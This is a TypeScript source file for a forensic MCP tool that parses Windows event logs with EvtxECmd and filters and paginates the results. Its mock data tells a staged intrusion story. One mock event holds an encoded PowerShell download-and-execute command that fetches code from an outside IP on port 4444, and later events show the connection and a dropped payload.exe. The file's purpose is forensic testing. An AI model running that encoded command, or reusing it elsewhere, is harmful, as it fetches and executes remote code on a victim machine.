import { z } from "zod";
import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import type { CallToolResult } from "@modelcontextprotocol/sdk/types.js";
import { execForensicTool, resolveToolPath, isMockMode } from "../utils/exec.js";
import {
  buildResult,
  buildErrorResult,
  type EventLogEntry,
  type ForensicToolResult,
} from "../schemas/output.js";

const DEFAULT_LIMIT = 500;

// --- Mock data ---
// Ordered and cross-referenced with the pslist / netscan / malfind mock chain
// so the triage loop produces a coherent scenario end-to-end.
const MOCK_EVENTS: EventLogEntry[] = [
  {
    record_id: 102341,
    event_id: 4624,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    computer: "WIN10-VICTIM",
    user_sid: "S-1-5-21-1004336348-1177238915-682003330-1013",
    timestamp: "2026-03-15T09:14:02Z",
    message: "An account was successfully logged on. (Logon type: 2 — Interactive)",
    data: { TargetUserName: "victim", LogonType: 2, WorkstationName: "WIN10-VICTIM", IpAddress: "-" },
  },
  {
    record_id: 102389,
    event_id: 4688,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    computer: "WIN10-VICTIM",
    user_sid: "S-1-5-21-1004336348-1177238915-682003330-1013",
    timestamp: "2026-03-15T09:14:33Z",
    message: "A new process has been created: cmd.exe",
    data: { NewProcessId: 2048, NewProcessName: "C:\\Windows\\System32\\cmd.exe", ParentProcessName: "C:\\Windows\\explorer.exe", ProcessCommandLine: "cmd.exe" },
  },
  {
    record_id: 102391,
    event_id: 4688,
    provider: "Microsoft-Windows-Security-Auditing",
    channel: "Security",
    level: "Information",
    computer: "WIN10-VICTIM",
    user_sid: "S-1-5-21-1004336348-1177238915-682003330-1013",
    timestamp: "2026-03-15T09:14:45Z",
    message: "A new process has been created: powershell.exe",
    data: {
      NewProcessId: 2112,
      NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      ParentProcessName: "C:\\Windows\\System32\\cmd.exe",
      ProcessCommandLine: "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADMANAA6ADQANAA0ADQAJwApAA==",
    },
  },
  {
    record_id: 987,
    event_id: 3,
    provider: "Microsoft-Windows-Sysmon",
    channel: "Microsoft-Windows-Sysmon/Operational",
    level: "Information",
    computer: "WIN10-VICTIM",
    user_sid: "S-1-5-21-1004336348-1177238915-682003330-1013",
    timestamp: "2026-03-15T09:15:33Z",
    message: "Network connection detected: powershell.exe → 185.220.101.34:4444",
    data: {
      ProcessId: 2112,
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      DestinationIp: "185.220.101.34",
      DestinationPort: 4444,
      Protocol: "tcp",
      Initiated: true,
    },
  },
  {
    record_id: 991,
    event_id: 11,
    provider: "Microsoft-Windows-Sysmon",
    channel: "Microsoft-Windows-Sysmon/Operational",
    level: "Information",
    computer: "WIN10-VICTIM",
    user_sid: "S-1-5-21-1004336348-1177238915-682003330-1013",
    timestamp: "2026-03-15T09:16:00Z",
    message: "File created: C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe",
    data: {
      ProcessId: 2112,
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      TargetFilename: "C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe",
    },
  },
];

function filterEvents(
  entries: EventLogEntry[],
  opts: {
    channel?: string;
    eventId?: number;
    provider?: string;
    timeRangeStart?: string;
    timeRangeEnd?: string;
  },
): EventLogEntry[] {
  let filtered = entries;

  if (opts.channel) {
    const c = opts.channel.toLowerCase();
    filtered = filtered.filter((e) => e.channel.toLowerCase().includes(c));
  }

  if (opts.eventId !== undefined) {
    filtered = filtered.filter((e) => e.event_id === opts.eventId);
  }

  if (opts.provider) {
    const p = opts.provider.toLowerCase();
    filtered = filtered.filter((e) => e.provider.toLowerCase().includes(p));
  }

  if (opts.timeRangeStart) {
    const start = new Date(opts.timeRangeStart).getTime();
    filtered = filtered.filter((e) => new Date(e.timestamp).getTime() >= start);
  }

  if (opts.timeRangeEnd) {
    const end = new Date(opts.timeRangeEnd).getTime();
    filtered = filtered.filter((e) => new Date(e.timestamp).getTime() <= end);
  }

  return filtered;
}

// --- EvtxECmd JSON row -> EventLogEntry ---
interface RawEvtxECmdRow {
  RecordNumber: number;
  EventId: number;
  Provider: string;
  Channel: string;
  Level: string;
  Computer: string;
  UserId: string | null;
  TimeCreated: string; // ISO-8601
  MapDescription?: string;
  Payload?: string; // JSON-encoded
  [key: string]: unknown;
}

function mapEvtxECmdRow(raw: RawEvtxECmdRow): EventLogEntry {
  let data: Record<string, unknown> = {};
  if (typeof raw.Payload === "string" && raw.Payload.trim().length > 0) {
    try {
      data = JSON.parse(raw.Payload);
    } catch {
      data = { Payload: raw.Payload };
    }
  }

  return {
    record_id: Number(raw.RecordNumber ?? 0),
    event_id: Number(raw.EventId ?? 0),
    provider: raw.Provider ?? "",
    channel: raw.Channel ?? "",
    level: raw.Level ?? "",
    computer: raw.Computer ?? "",
    user_sid: raw.UserId ?? null,
    timestamp: new Date(raw.TimeCreated).toISOString(),
    message: raw.MapDescription ?? "",
    data,
  };
}

function parseEvtxECmdJsonlOutput(stdout: string): EventLogEntry[] {
  const lines = stdout.split("\n").filter((l) => l.trim().length > 0);
  const results: EventLogEntry[] = [];
  for (const line of lines) {
    try {
      const row = JSON.parse(line) as RawEvtxECmdRow;
      results.push(mapEvtxECmdRow(row));
    } catch {
      // Skip non-JSON lines (EvtxECmd emits a banner on stdout in some versions)
    }
  }
  return results;
}

export function registerParseEventLogs(server: McpServer): void {
  server.tool(
    "parse_event_logs",
    "Parse Windows Event Logs (.evtx) via EvtxECmd and return structured, paginated JSON. Use channel and eventId filters to scope the query — unfiltered Security.evtx alone is easily millions of entries and will overflow the context window. Prefer this over raw EvtxECmd CSV output.",
    {
      evidencePath: z
        .string()
        .describe("Absolute path to a .evtx file OR a directory containing .evtx files"),
      channel: z
        .string()
        .optional()
        .describe("Filter by channel substring (e.g. 'Security', 'Sysmon/Operational')"),
      eventId: z.number().int().optional().describe("Filter to a specific Event ID"),
      provider: z.string().optional().describe("Filter by provider name substring"),
      timeRangeStart: z.string().optional().describe("ISO-8601 start time filter"),
      timeRangeEnd: z.string().optional().describe("ISO-8601 end time filter"),
      offset: z.number().int().nonnegative().default(0).describe("Pagination offset"),
      limit: z.number().int().positive().max(5000).default(DEFAULT_LIMIT).describe("Max results (1–5000)"),
    },
    async (params): Promise<CallToolResult> => {
      const { evidencePath, channel, eventId, provider, timeRangeStart, timeRangeEnd, offset, limit } =
        params;

      const toolMeta = {
        source_artefact: evidencePath,
        tool: "EvtxECmd",
        tool_version: "1.5.x",
      };

      let entries: EventLogEntry[];

      if (isMockMode()) {
        entries = MOCK_EVENTS;
      } else {
        const evtxCmdPath = resolveToolPath("EVTXECMD_PATH", "EvtxECmd");

        // EvtxECmd.exe -f <file> | -d <dir>  --json <outDir> --jsonf output.json
        // Simplest portable invocation: write JSONL to stdout via --json -
        // (newer EvtxECmd versions); fall back to file-based output if needed.
        const isDir = !evidencePath.toLowerCase().endsWith(".evtx");
        const args = [
          isDir ? "-d" : "-f",
          evidencePath,
          "--json",
          "-",
          "--jsonf",
          "stdout.json",
        ];

        const exec = await execForensicTool(evtxCmdPath, args, { timeoutMs: 300_000 });

        if (exec.exitCode !== 0) {
          const errResult = buildErrorResult(
            `EvtxECmd failed (exit ${exec.exitCode}): ${exec.stderr.slice(0, 500)}`,
            toolMeta,
          );
          return {
            content: [{ type: "text", text: JSON.stringify(errResult, null, 2) }],
            isError: true,
          };
        }

        entries = parseEvtxECmdJsonlOutput(exec.stdout);
      }

      const filtered = filterEvents(entries, {
        channel,
        eventId,
        provider,
        timeRangeStart,
        timeRangeEnd,
      });

      const result: ForensicToolResult<EventLogEntry[]> = buildResult(
        filtered,
        offset,
        limit,
        toolMeta,
      );

      return {
        content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
      };
    },
  );
}
